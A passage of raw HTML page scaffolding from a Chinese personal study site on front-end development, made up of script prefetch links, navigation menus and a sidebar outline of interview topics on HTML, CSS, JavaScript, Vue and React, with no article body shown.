href="/rat-summ/assets/js/456.6973979f.js"><link rel="prefetch" href="/rat-summ/assets/js/457.3cb9217b.js"><link rel="prefetch" href="/rat-summ/assets/js/458.79141a21.js"><link rel="prefetch" href="/rat-summ/assets/js/459.abcc974c.js"><link rel="prefetch" href="/rat-summ/assets/js/46.8c8bf5f1.js"><link rel="prefetch" href="/rat-summ/assets/js/460.b38c1ada.js"><link rel="prefetch" href="/rat-summ/assets/js/461.62beb08c.js"><link rel="prefetch" href="/rat-summ/assets/js/462.64f5f4e1.js"><link rel="prefetch" href="/rat-summ/assets/js/463.83081d34.js"><link rel="prefetch" href="/rat-summ/assets/js/464.d610e5ce.js"><link rel="prefetch" href="/rat-summ/assets/js/465.193b3b89.js"><link rel="prefetch" href="/rat-summ/assets/js/466.419fe212.js"><link rel="prefetch" href="/rat-summ/assets/js/467.910dc67d.js"><link rel="prefetch" href="/rat-summ/assets/js/468.b93c4e70.js"><link rel="prefetch" href="/rat-summ/assets/js/469.a4bc872a.js"><link rel="prefetch" href="/rat-summ/assets/js/47.11f3cc99.js"><link rel="prefetch" href="/rat-summ/assets/js/470.477c2897.js"><link rel="prefetch" href="/rat-summ/assets/js/471.abfff3cd.js"><link rel="prefetch" href="/rat-summ/assets/js/472.b8aea607.js"><link rel="prefetch" href="/rat-summ/assets/js/473.f6d4bd02.js"><link rel="prefetch" href="/rat-summ/assets/js/474.9449d59a.js"><link rel="prefetch" href="/rat-summ/assets/js/475.8a4bbfb6.js"><link rel="prefetch" href="/rat-summ/assets/js/476.0269ac30.js"><link rel="prefetch" href="/rat-summ/assets/js/477.3bcc01f0.js"><link rel="prefetch" href="/rat-summ/assets/js/478.c307cee9.js"><link rel="prefetch" href="/rat-summ/assets/js/479.c70c4a8e.js"><link rel="prefetch" href="/rat-summ/assets/js/48.05e97651.js"><link rel="prefetch" href="/rat-summ/assets/js/480.ac7405da.js"><link rel="prefetch" href="/rat-summ/assets/js/481.04261af4.js"><link rel="prefetch" href="/rat-summ/assets/js/482.7db8d1e2.js"><link rel="prefetch" href="/rat-summ/assets/js/483.ba568078.js"><link rel="prefetch" href="/rat-summ/assets/js/484.48a25747.js"><link rel="prefetch" href="/rat-summ/assets/js/485.d26a0a83.js"><link rel="prefetch" href="/rat-summ/assets/js/486.a50b2468.js"><link rel="prefetch" href="/rat-summ/assets/js/487.89c199d5.js"><link rel="prefetch" href="/rat-summ/assets/js/488.11ffda69.js"><link rel="prefetch" href="/rat-summ/assets/js/489.f410761e.js"><link rel="prefetch" href="/rat-summ/assets/js/49.4f8217ba.js"><link rel="prefetch" href="/rat-summ/assets/js/490.1d754006.js"><link rel="prefetch" href="/rat-summ/assets/js/491.80c5139a.js"><link rel="prefetch" href="/rat-summ/assets/js/492.d29884ed.js"><link rel="prefetch" href="/rat-summ/assets/js/493.605b5b69.js"><link rel="prefetch" href="/rat-summ/assets/js/494.cf11b24a.js"><link rel="prefetch" href="/rat-summ/assets/js/495.4fed3a56.js"><link rel="prefetch" href="/rat-summ/assets/js/496.2f9b5653.js"><link rel="prefetch" href="/rat-summ/assets/js/497.bdf700cb.js"><link rel="prefetch" href="/rat-summ/assets/js/498.c37bf4a0.js"><link rel="prefetch" href="/rat-summ/assets/js/499.273512ce.js"><link rel="prefetch" href="/rat-summ/assets/js/5.eb8a0105.js"><link rel="prefetch" href="/rat-summ/assets/js/50.8b43ef9b.js"><link rel="prefetch" href="/rat-summ/assets/js/500.41ab926a.js"><link rel="prefetch" href="/rat-summ/assets/js/501.b7e68b2b.js"><link rel="prefetch" href="/rat-summ/assets/js/502.c21b2ced.js"><link rel="prefetch" href="/rat-summ/assets/js/503.57cfc1cb.js"><link rel="prefetch" href="/rat-summ/assets/js/504.3737dd74.js"><link rel="prefetch" href="/rat-summ/assets/js/505.1a6e2c5c.js"><link rel="prefetch" href="/rat-summ/assets/js/506.bec8c785.js"><link rel="prefetch" href="/rat-summ/assets/js/507.9850a1ea.js"><link rel="prefetch" href="/rat-summ/assets/js/508.345fb54a.js"><link rel="prefetch" href="/rat-summ/assets/js/509.12b14128.js"><link rel="prefetch" href="/rat-summ/assets/js/51.6837cba4.js"><link rel="prefetch" href="/rat-summ/assets/js/510.0595d708.js"><link rel="prefetch" href="/rat-summ/assets/js/511.9ebeed80.js"><link rel="prefetch" href="/rat-summ/assets/js/512.a4b26565.js"><link rel="prefetch" href="/rat-summ/assets/js/513.dae12896.js"><link rel="prefetch" href="/rat-summ/assets/js/514.98452f74.js"><link rel="prefetch" href="/rat-summ/assets/js/515.79ac850c.js"><link rel="prefetch" href="/rat-summ/assets/js/516.2b46c6b5.js"><link rel="prefetch" href="/rat-summ/assets/js/517.21cae069.js"><link rel="prefetch" href="/rat-summ/assets/js/518.618ba011.js"><link rel="prefetch" href="/rat-summ/assets/js/519.d295be6f.js"><link rel="prefetch" href="/rat-summ/assets/js/52.6a3d1870.js"><link rel="prefetch" href="/rat-summ/assets/js/520.77322b7a.js"><link rel="prefetch" href="/rat-summ/assets/js/521.ab51a9d7.js"><link rel="prefetch" href="/rat-summ/assets/js/522.95569e5d.js"><link rel="prefetch" href="/rat-summ/assets/js/523.19e88a87.js"><link rel="prefetch" href="/rat-summ/assets/js/524.a9f13ff4.js"><link rel="prefetch" href="/rat-summ/assets/js/525.55775443.js"><link rel="prefetch" href="/rat-summ/assets/js/526.796f403d.js"><link rel="prefetch" href="/rat-summ/assets/js/527.8777ce49.js"><link rel="prefetch" href="/rat-summ/assets/js/528.fdc61407.js"><link rel="prefetch" href="/rat-summ/assets/js/529.410e276b.js"><link rel="prefetch" href="/rat-summ/assets/js/53.73686482.js"><link rel="prefetch" href="/rat-summ/assets/js/530.f4fc62f0.js"><link rel="prefetch" href="/rat-summ/assets/js/531.58338ca6.js"><link rel="prefetch" href="/rat-summ/assets/js/54.b4f9eb75.js"><link rel="prefetch" href="/rat-summ/assets/js/55.df849147.js"><link rel="prefetch" href="/rat-summ/assets/js/56.96d53eac.js"><link rel="prefetch" href="/rat-summ/assets/js/57.f19e0377.js"><link rel="prefetch" href="/rat-summ/assets/js/58.46887073.js"><link rel="prefetch" href="/rat-summ/assets/js/59.3f235b14.js"><link rel="prefetch" href="/rat-summ/assets/js/6.0306f3a7.js"><link rel="prefetch" href="/rat-summ/assets/js/60.f00dba60.js"><link rel="prefetch" href="/rat-summ/assets/js/61.110e9966.js"><link rel="prefetch" href="/rat-summ/assets/js/62.77adea85.js"><link rel="prefetch" href="/rat-summ/assets/js/63.84621a5a.js"><link rel="prefetch" href="/rat-summ/assets/js/64.c5e5007f.js"><link rel="prefetch" href="/rat-summ/assets/js/65.7932d639.js"><link rel="prefetch" href="/rat-summ/assets/js/66.f7b98c28.js"><link rel="prefetch" href="/rat-summ/assets/js/67.f73aa713.js"><link rel="prefetch" href="/rat-summ/assets/js/68.cd494063.js"><link rel="prefetch" href="/rat-summ/assets/js/69.b044b142.js"><link rel="prefetch" href="/rat-summ/assets/js/7.3eb2e5f4.js"><link rel="prefetch" href="/rat-summ/assets/js/70.fde8898d.js"><link rel="prefetch" href="/rat-summ/assets/js/71.9f0111ee.js"><link rel="prefetch" href="/rat-summ/assets/js/72.a980e88b.js"><link rel="prefetch" href="/rat-summ/assets/js/73.f83a1246.js"><link rel="prefetch" href="/rat-summ/assets/js/74.466aeb6d.js"><link rel="prefetch" href="/rat-summ/assets/js/75.8267a967.js"><link rel="prefetch" href="/rat-summ/assets/js/76.d627aaef.js"><link rel="prefetch" href="/rat-summ/assets/js/77.7f0d7168.js"><link rel="prefetch" href="/rat-summ/assets/js/78.1793ccbe.js"><link rel="prefetch" href="/rat-summ/assets/js/79.482c515e.js"><link rel="prefetch" href="/rat-summ/assets/js/8.79d1c3bb.js"><link rel="prefetch" href="/rat-summ/assets/js/80.3915b314.js"><link rel="prefetch" href="/rat-summ/assets/js/81.b8ec0fa5.js"><link rel="prefetch" href="/rat-summ/assets/js/82.dc9885a7.js"><link rel="prefetch" href="/rat-summ/assets/js/83.2d36b6a8.js"><link rel="prefetch" href="/rat-summ/assets/js/84.0ee5beb0.js"><link rel="prefetch" href="/rat-summ/assets/js/85.adac7d72.js"><link rel="prefetch" href="/rat-summ/assets/js/86.d7ed3e20.js"><link rel="prefetch" href="/rat-summ/assets/js/87.93bc5012.js"><link rel="prefetch" href="/rat-summ/assets/js/88.13a7244f.js"><link rel="prefetch" href="/rat-summ/assets/js/89.5512fba5.js"><link rel="prefetch" href="/rat-summ/assets/js/9.9db0e627.js"><link rel="prefetch" href="/rat-summ/assets/js/90.0d36bb3b.js"><link rel="prefetch" href="/rat-summ/assets/js/91.3b31c7ee.js"><link rel="prefetch" href="/rat-summ/assets/js/92.01af09c3.js"><link rel="prefetch" href="/rat-summ/assets/js/93.c98fe6f4.js"><link rel="prefetch" href="/rat-summ/assets/js/94.23a6678b.js"><link rel="prefetch" href="/rat-summ/assets/js/95.c50f9e7e.js"><link rel="prefetch" href="/rat-summ/assets/js/96.36897011.js"><link rel="prefetch" href="/rat-summ/assets/js/97.dead9357.js"><link rel="prefetch" href="/rat-summ/assets/js/98.e487ff01.js"><link rel="prefetch" href="/rat-summ/assets/js/99.2474b24c.js">
    <link rel="stylesheet" href="/rat-summ/assets/css/0.styles.b7fb6ee3.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/rat-summ/" class="home-link router-link-active"><img src="/rat-summ/img/logo.png" alt="写作认知体系" class="logo"> <span class="site-name can-hide">写作认知体系</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/rat-summ/" class="nav-link">首页</a></div><div class="nav-item"><a href="/rat-summ/writeRead/" class="nav-link">写作阅读</a></div><div class="nav-item"><a href="/rat-summ/promoteOper/" class="nav-link">推广运营</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="💖职场技能" class="dropdown-title"><a href="/rat-summ/workSkill/" class="link-title">💖职场技能</a> <span class="title" style="display:none;">💖职场技能</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/rat-summ/skill-note/" class="nav-link">技能记录</a></li><li class="dropdown-item"><!----> <a href="/rat-summ/skill-inter/" class="nav-link">面试技巧</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="🌹快捷入口" class="dropdown-title"><!----> <span class="title" style="display:;">🌹快捷入口</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>快捷链接</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/rat-summ/pages/devLink/" class="nav-link">开发收藏</a></li></ul></li><li class="dropdown-item"><h4>💖体系入口</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="https://my.samyz.cn/rat-skill" target="_blank" rel="noopener noreferrer" class="nav-link external">
  工作实践体系
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-subitem"><a href="https://my.samyz.cn/rat-summ" target="_blank" rel="noopener noreferrer" class="nav-link external">
  写作认知体系
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-subitem"><a href="https://my.samyz.cn/rat-invest" target="_blank" rel="noopener noreferrer" class="nav-link external">
  投资理财体系
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ul></div></div> <a href="https://github.com/samyzh/rat-summ" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><!----> <nav class="nav-links"><div class="nav-item"><a href="/rat-summ/" class="nav-link">首页</a></div><div class="nav-item"><a href="/rat-summ/writeRead/" class="nav-link">写作阅读</a></div><div class="nav-item"><a href="/rat-summ/promoteOper/" class="nav-link">推广运营</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="💖职场技能" class="dropdown-title"><a href="/rat-summ/workSkill/" class="link-title">💖职场技能</a> <span class="title" style="display:none;">💖职场技能</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/rat-summ/skill-note/" class="nav-link">技能记录</a></li><li class="dropdown-item"><!----> <a href="/rat-summ/skill-inter/" class="nav-link">面试技巧</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="🌹快捷入口" class="dropdown-title"><!----> <span class="title" style="display:;">🌹快捷入口</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>快捷链接</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/rat-summ/pages/devLink/" class="nav-link">开发收藏</a></li></ul></li><li class="dropdown-item"><h4>💖体系入口</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="https://my.samyz.cn/rat-skill" target="_blank" rel="noopener noreferrer" class="nav-link external">
  工作实践体系
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-subitem"><a href="https://my.samyz.cn/rat-summ" target="_blank" rel="noopener noreferrer" class="nav-link external">
  写作认知体系
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-subitem"><a href="https://my.samyz.cn/rat-invest" target="_blank" rel="noopener noreferrer" class="nav-link external">
  投资理财体系
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ul></div></div> <a href="https://github.com/samyzh/rat-summ" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>my</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/ddae31/" class="sidebar-link">自己认知及反思技能</a></li><li><a href="/rat-summ/pages/3e4c45/" class="sidebar-link">vue总体最核心</a></li><li><a href="/rat-summ/pages/e1f0b8/" class="sidebar-link">软技能</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>html&amp;css相关</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/8ab4a8/" class="sidebar-link">html&amp;css相关基础</a></li><li><a href="/rat-summ/pages/68c903/" class="sidebar-link">浏览器渲染优化内存相关汇总</a></li><li><a href="/rat-summ/pages/e0fae4/" class="sidebar-link">html常见汇总</a></li><li><a href="/rat-summ/pages/8bffec/" class="sidebar-link">css相关汇总</a></li><li><a href="/rat-summ/pages/914e25/" class="sidebar-link">html&amp;js组合相关汇总</a></li><li><a href="/rat-summ/pages/2a4dff/" class="sidebar-link">图片及文件流其他相关汇总</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>js相关</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/680db6/" class="sidebar-link">js相关基础</a></li><li><a href="/rat-summ/pages/bf84b5/" class="sidebar-link">js类型&amp;数组函数汇总</a></li><li><a href="/rat-summ/pages/755e9f/" class="sidebar-link">对象原型链及es6相关汇总</a></li><li><a href="/rat-summ/pages/f76f5b/" class="sidebar-link">事件及异步相关汇总</a></li><li><a href="/rat-summ/pages/80ebf3/" class="sidebar-link">手写及算法相关汇总</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>node相关</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/f7bce0/" class="sidebar-link">koa相关</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>工程化相关</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/0ac51e/" class="sidebar-link">工程化相关基础</a></li><li><a href="/rat-summ/pages/f1db1d/" class="sidebar-link">webpack相关汇总</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>vue相关</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/92d7a0/" class="sidebar-link">vue相关基础</a></li><li><a href="/rat-summ/pages/57e70c/" class="sidebar-link">vue相关汇总</a></li><li><a href="/rat-summ/pages/e9d2e4/" class="sidebar-link">vuex相关汇总</a></li><li><a href="/rat-summ/pages/6a181e/" class="sidebar-link">vue-router相关汇总</a></li><li><a href="/rat-summ/pages/fe00d5/" class="sidebar-link">vue进阶相关整理</a></li><li><a href="/rat-summ/pages/vue2-zinter/" class="sidebar-link">vue2x题汇总及原理分析</a></li><li><a href="/rat-summ/pages/cb2c9d/" class="sidebar-link">vue3x面试题汇总及原理分析</a></li><li><a href="/rat-summ/pages/bd0191/" class="sidebar-link">vue其他相关题汇总</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>react相关</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/566876/" class="sidebar-link">react相关基础</a></li><li><a href="/rat-summ/pages/efd0b7/" class="sidebar-link">react相关汇总</a></li><li><a href="/rat-summ/pages/cda868/" class="sidebar-link">react组件汇总</a></li><li><a href="/rat-summ/pages/a63427/" class="sidebar-link">redux_flux相关汇总</a></li><li><a href="/rat-summ/pages/ffb996/" class="sidebar-link">react路由相关汇总</a></li><li><a href="/rat-summ/pages/85c4ca/" class="sidebar-link">hooks相关汇总</a></li><li><a href="/rat-summ/pages/3ebf27/" class="sidebar-link">虚拟dom_fiber相关汇总</a></li><li><a href="/rat-summ/pages/907fde/" class="sidebar-link">react面试题汇总</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>h5相关</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/9a840f/" class="sidebar-link">h5相关基础</a></li><li><a href="/rat-summ/pages/ba8912/" class="sidebar-link">h5适配相关</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>算法&amp;设计模式</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/07e2ba/" class="sidebar-link">高频算法题系列</a></li><li><a href="/rat-summ/pages/593b9d/" class="sidebar-link">算法相关汇总</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>优化相关</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/ef4a8f/" class="sidebar-link">前端性能优化相关汇总</a></li><li><a href="/rat-summ/pages/42f929/" class="sidebar-link">webpack优化</a></li><li><a href="/rat-summ/pages/0436d2/" class="sidebar-link">微前端</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>协议相关</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/19522b/" class="sidebar-link">网络相关基础</a></li><li><a href="/rat-summ/pages/e315e1/" class="sidebar-link">网络模型DNS_TCPIP相关汇总</a></li><li><a href="/rat-summ/pages/b6110a/" class="sidebar-link">http相关汇总</a></li><li><a href="/rat-summ/pages/fe5b8b/" class="sidebar-link">websocket相关汇总</a></li><li><a href="/rat-summ/pages/f4787f/" class="sidebar-link">mqtt相关汇总</a></li><li><a href="/rat-summ/pages/c4548f/" class="sidebar-link">安全相关汇总</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>部署相关</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/286b5e/" class="sidebar-link">index</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>综合集训</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/7ba1f8/" class="sidebar-link">刷题文章</a></li><li><a href="/rat-summ/pages/b8393d/" class="sidebar-link">面试题集训1</a></li><li><a href="/rat-summ/pages/2fd1d4/" class="sidebar-link">面试题集训2</a></li><li><a href="/rat-summ/pages/d9fe72/" class="sidebar-link">面试题集训3</a></li><li><a href="/rat-summ/pages/71cd80/" class="sidebar-link">面试题集训4</a></li><li><a href="/rat-summ/pages/a1faae/" class="sidebar-link">面试题集训5</a></li><li><a href="/rat-summ/pages/7e81c5/" class="sidebar-link">面试题集训6</a></li><li><a href="/rat-summ/pages/52f33c/" class="sidebar-link">面试题集训7</a></li><li><a href="/rat-summ/pages/52e3a9/" class="sidebar-link">面试题训练8</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>android相关</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/37a183/" class="sidebar-link">android面试</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>技能指南</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/c9b4ac/" class="sidebar-link">面试重新梳理</a></li><li><a href="/rat-summ/pages/zinter-core-sort/" aria-current="page" class="active sidebar-link">核心知识点精选</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#html-10题" class="sidebar-link">html[10题]</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_1-新语法及特点" class="sidebar-link">1:新语法及特点</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_2-canvas-api" class="sidebar-link">2:Canvas API</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_3-drag-api拖放" class="sidebar-link">3:Drag API拖放</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_4-websockets-api-http1-1" class="sidebar-link">4:WebSockets API～http1.1</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_5-存储storage-cookie" class="sidebar-link">5:存储storage/cookie</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_6-浏览器相关" class="sidebar-link">6:浏览器相关</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_7-json-ajax" class="sidebar-link">7:Json/Ajax</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_8-bom-dom-事件" class="sidebar-link">8:BOM/DOM/事件</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_9-jquery-zepto" class="sidebar-link">9:jQuery/zepto</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_10-其他及兼容及优化" class="sidebar-link">10:其他及兼容及优化</a></li></ul></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#css-10题" class="sidebar-link">css[10题]</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_1-css选择器的优先级" class="sidebar-link">1:CSS选择器的优先级</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_2-css单位" class="sidebar-link">2:CSS单位</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_3-盒子模型" class="sidebar-link">3:盒子模型</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_4-布局相关设置【pdfoz】" class="sidebar-link">4:布局相关设置【PDFOZ】</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_5-flex-布局" class="sidebar-link">5:Flex 布局</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_6-水平-垂直居中" class="sidebar-link">6:水平/垂直居中</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_7-bfc" class="sidebar-link">7:BFC</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_8-css3" class="sidebar-link">8:css3</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_9-less-sass" class="sidebar-link">9:Less/Sass</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_10-css兼容性" class="sidebar-link">10:css兼容性</a></li></ul></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#js-10题" class="sidebar-link">js[10题]</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#基础" class="sidebar-link">基础</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#变量-函数-解构-扩展-原型链" class="sidebar-link">变量/函数/解构/扩展/原型链</a></li><li 